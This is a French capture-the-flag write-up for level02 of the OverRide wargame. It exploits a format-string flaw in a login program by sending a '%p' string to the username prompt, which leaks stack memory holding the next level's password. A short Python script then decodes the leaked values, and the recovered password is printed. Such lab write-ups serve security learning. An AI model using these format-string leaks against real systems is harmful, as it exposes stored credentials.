Un programme ne prenant pas de paramètres, qui demande un login et un mot de passe.
En le décompilant, on cible deux pistes:
- on peut voir que le fichier .pass de l'user level03 est stocké dans une variable
- qu'un appel à /bin/sh est effectué si une condition est respectée.
Le login, capturé en premier dans l'entrée standard, est affiché tel quel par un printf, on devrait donc pouvoir utiliser la faille du format string pour chercher à afficher directement
le contenu du fichier ?
On commence par chercher l'adresse de l'offset de printf

	level02@OverRide:~$ python -c 'print "%p "*100' > /tmp/exploit
	level02@OverRide:~$  cat /tmp/exploit - | ./level02
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: --[ Password: *****************************************
	0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070
	0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520
	0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil)0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!

	En décodant les chaînes récurrentes, on voit bien que celles ci correspondent à nos %p: 0x7025207025207025 0x2520702520702520 0x2070252070252070
	On voit 5 chaines qui nous interpellent : 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
	Chacune de ces chaines nous donnent une chaîne de caractères :
	(dans l'ordre):
	- unPR47hH
	- EAJ5as9Q
	- 7zqCWNgX
	- 5J5hnGXs
	- H3gPfK9M

Qu'il faudrait reverse (car stocké en mémoire en little endian, donc à l'envers pour nous).

Place à un petit script python pour rendre le tout plus joli :

	import sys

	str = '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'

	for part in str.split('0x'):
			sys.stdout.write(part.decode('hex')[::-1])
	print

Qu'on lance :
	level02@OverRide:~$ python /tmp/decode
	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
